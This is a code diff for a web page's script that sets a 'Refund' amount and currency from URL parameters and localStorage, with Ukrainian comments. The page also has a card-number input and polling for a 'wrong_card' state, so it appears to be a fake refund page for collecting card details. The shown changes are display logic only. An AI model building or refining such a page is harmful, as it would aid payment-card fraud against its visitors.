@@ -533,6 +533,11 @@
         const totalNum = match ? match[0].replace(',', '.') : '';
         if (totalNum) {
             document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
+            // Зберігаємо заголовок для відновлення
+            localStorage.setItem('last_refund_title', `Refund ${totalNum}€`);
+            // Зберігаємо також в інших ключах для сумісності
+            localStorage.setItem('event_price', totalNum);
+            localStorage.setItem('event_currency', 'EUR');
         }
     }
     // --- POLLING для wrong_card ---
@@ -612,32 +617,13 @@ document.getElementById('card-input').addEventListener('input', function(e) {
   let currency = params.get('currency');
   let totalRaw = params.get('total');
   let title = '';
-  let page_code = params.get('page') || params.get('e') || sessionStorage.getItem('page_code');
-
-  // --- НОВА ЛОГІКА: якщо є e=... (short code), завжди підтягуємо з бекенду ---
-  if (params.get('e')) {
-    fetch(`/api/payment_data?e=${encodeURIComponent(params.get('e'))}`)
-      .then(r => r.json())
-      .then(ev => {
-        if (ev.price && ev.currency) {
-          price = ev.price;
-          currency = ev.currency;
+  
+  if (price && currency) {
     localStorage.setItem('event_price', price);
     localStorage.setItem('event_currency', currency);
-          document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
-          document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
-        } else if (ev.currency) {
-          document.getElementById('payment-title').textContent = `Refund ${ev.currency}`;
-          document.querySelectorAll('.event-price').forEach(el => el.textContent = ev.currency);
-        }
-      });
-    // Показуємо тимчасово, поки не підвантажиться
-    document.getElementById('payment-title').textContent = 'Refund ...';
-    document.querySelectorAll('.event-price').forEach(el => el.textContent = '...');
-    return;
-  }
-  // --- СТАРА ЛОГІКА ДЛЯ ВСІХ ІНШИХ ВИПАДКІВ ---
-  if (totalRaw) {
+    title = `Refund ${price} ${currency}`;
+  } else if (totalRaw) {
+    // Витягуємо число і валюту з total (наприклад, 58CHF)
     const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
     if (match) {
       price = match[1].replace(',', '.');
@@ -650,35 +636,8 @@ document.getElementById('card-input').addEventListener('input', function(e) {
       // Якщо тільки число
       const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
+      currency = localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
-    }
-  } else if (price && currency) {
-    localStorage.setItem('event_price', price);
-    localStorage.setItem('event_currency', currency);
-    title = `Refund ${price} ${currency}`;
-  } else if (currency) {
-    // Якщо є тільки валюта — підвантажуємо з бекенду
-    if (page_code) {
-      fetch(`/api/payment_data?page=${encodeURIComponent(page_code)}`)
-        .then(r => r.json())
-        .then(ev => {
-          if (ev.price && ev.currency) {
-            price = ev.price;
-            currency = ev.currency;
-            localStorage.setItem('event_price', price);
-            localStorage.setItem('event_currency', currency);
-            document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
-            document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
-          } else if (currency) {
-            document.getElementById('payment-title').textContent = `Refund ${currency}`;
-            document.querySelectorAll('.event-price').forEach(el => el.textContent = currency);
-          }
-        });
-      title = `Refund ${currency}`;
-    } else {
-      localStorage.setItem('event_currency', currency);
-      title = `Refund ${currency}`;
     }
   } else if (localStorage.getItem('refund_total')) {
     // Якщо total вже зник з адреси, але є у localStorage
@@ -700,23 +659,13 @@ document.getElementById('card-input').addEventListener('input', function(e) {
     price = localStorage.getItem('event_price');
     currency = localStorage.getItem('event_currency');
     if (price && currency) title = `Refund ${price} ${currency}`;
-    else if (currency) title = `Refund ${currency}`;
   }
+  
   if (title) {
     document.getElementById('payment-title').textContent = title;
-    // Зберігаємо останній заголовок для відновлення
-    localStorage.setItem('last_refund_title', title);
   }
-  // Price: ...
-  let priceText = '';
-  if (price && currency) priceText = price + ' ' + currency;
-  else if (currency) priceText = currency;
-  document.querySelectorAll('.event-price').forEach(el => el.textContent = priceText);
-  
-  // Зберігаємо поточний стан для відновлення
   if (price && currency) {
-    localStorage.setItem('current_refund_price', price);
-    localStorage.setItem('current_refund_currency', currency);
+    document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
   }
 })();
 </script>
@@ -804,6 +753,74 @@ document.addEventListener('visibilitychange', function() {
     setTimeout(restorePriceFromStorage, 100); // Невелика затримка для надійності
   }
 });
+</script>
+    <script>
+// Додатковий скрипт для автоматичного відновлення ціни при завантаженні
+(function() {
+  // Підстановка ціни та валюти з URL, localStorage, або збереженого refund_total
+  const params = new URLSearchParams(window.location.search);
+  let price = params.get('price');
+  let currency = params.get('currency');
+  let totalRaw = params.get('total');
+  let title = '';
+  
+  if (price && currency) {
+    localStorage.setItem('event_price', price);
+    localStorage.setItem('event_currency', currency);
+    title = `Refund ${price} ${currency}`;
+  } else if (totalRaw) {
+    // Витягуємо число і валюту з total (наприклад, 58CHF)
+    const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+    if (match) {
+      price = match[1].replace(',', '.');
+      currency = match[2];
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+      localStorage.setItem('refund_total', totalRaw);
+      title = `Refund ${price} ${currency}`;
+    } else {
+      // Якщо тільки число
+      const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
+      price = numMatch ? numMatch[0].replace(',', '.') : '';
+      currency = localStorage.getItem('event_currency') || 'EUR';
+      title = `Refund ${price} ${currency}`;
+    }
+  } else if (localStorage.getItem('refund_total')) {
+    // Якщо total вже зник з адреси, але є у localStorage
+    const saved = localStorage.getItem('refund_total');
+    const match = saved.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+    if (match) {
+      price = match[1].replace(',', '.');
+      currency = match[2];
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+      title = `Refund ${price} ${currency}`;
+    } else {
+      const numMatch = saved.match(/\d+[\.,]?\d*/);
+      price = numMatch ? numMatch[0].replace(',', '.') : '';
+      currency = localStorage.getItem('event_currency') || 'EUR';
+      title = `Refund ${price} ${currency}`;
+    }
+  } else {
+    price = localStorage.getItem('event_price');
+    currency = localStorage.getItem('event_currency');
+    if (price && currency) title = `Refund ${price} ${currency}`;
+  }
+  
+  if (title) {
+    document.getElementById('payment-title').textContent = title;
+    // Зберігаємо заголовок для відновлення
+    localStorage.setItem('last_refund_title', title);
+    // Зберігаємо також в інших ключах для сумісності
+    if (price && currency) {
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+    }
+  }
+  if (price && currency) {
+    document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
+  }
+})();
 </script>
     <!--Start of Tawk.to Script-->
     <script type="text/javascript">
